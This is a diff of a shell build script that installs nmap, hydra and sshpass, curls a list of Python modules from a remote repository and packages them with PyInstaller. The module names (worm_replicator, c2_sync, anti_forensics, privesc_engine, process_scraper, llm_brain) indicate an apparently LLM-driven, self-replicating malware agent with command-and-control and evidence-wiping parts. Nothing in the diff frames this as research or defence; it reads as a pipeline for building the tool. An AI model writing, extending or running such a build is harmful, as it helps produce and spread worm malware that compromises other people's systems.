@@ -11,13 +11,18 @@ cd "$WORKDIR"
 apt-get update -y
 apt-get install -y python3 python3-venv python3-pip git build-essential nmap hydra sshpass rsync
 
-# Download source files (including all .py files)
-for file in main.py core/*.py modules/*.py utils/*.py requirements.txt; do
+# Download each file explicitly (no wildcards)
+for file in \
+    main.py \
+    core/daemonizer.py core/orchestrator.py core/anti_forensics.py core/c2_sync.py core/llm_brain.py \
+    modules/network_recon.py modules/file_crawler.py modules/privesc_engine.py modules/attack_planner.py modules/worm_replicator.py modules/process_scraper.py \
+    utils/net_utils.py utils/crypto_utils.py utils/logging_utils.py \
+    requirements.txt; do
     mkdir -p "$(dirname "$file")"
     curl -s -o "$file" "$REPO_URL/$file"
 done
 
-# Ensure __init__.py exists (needed for PyInstaller's package detection)
+# Ensure __init__.py exists in each package folder (needed for PyInstaller)
 touch core/__init__.py modules/__init__.py utils/__init__.py
 
 # Verify downloaded files
@@ -31,9 +36,7 @@ pip install --upgrade pip
 pip install -r requirements.txt
 pip install pyinstaller
 
-# ============================================================
-# Generate a custom .spec file that collects all submodules
-# ============================================================
+# Generate spec file to collect all submodules
 cat > main.spec <<EOF
 # -*- mode: python ; coding: utf-8 -*-
 from PyInstaller.utils.hooks import collect_submodules
